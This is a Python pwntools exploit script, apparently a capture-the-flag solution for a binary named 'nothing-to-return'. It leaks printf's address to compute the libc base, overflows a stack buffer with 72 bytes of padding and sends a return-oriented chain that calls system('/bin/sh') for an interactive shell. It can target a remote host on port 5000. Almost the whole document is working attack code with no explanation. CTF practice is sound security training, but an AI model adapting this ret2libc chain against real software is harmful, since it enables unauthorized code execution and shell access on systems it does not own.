#!/usr/bin/python3

from pwn import *

exe = ELF('nothing-to-return_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.30.126.104', 5000)
else:
        p = process(exe.path)
GDB()
p.recvuntil(b"printf is at ")
libc.address = int(p.recvline(keepends = False), 16) - 0x56250
rop = ROP(libc)

sla(b':', str(0x100))
sla(b':', b'a'*64 + b'a'*8 + flat(rop.find_gadget(['pop rdi', 'ret']).address+1,rop.find_gadget(['pop rdi', 'ret']).address, next(libc.search(b"/bin/sh\0")), libc.sym.system))
p.interactive()
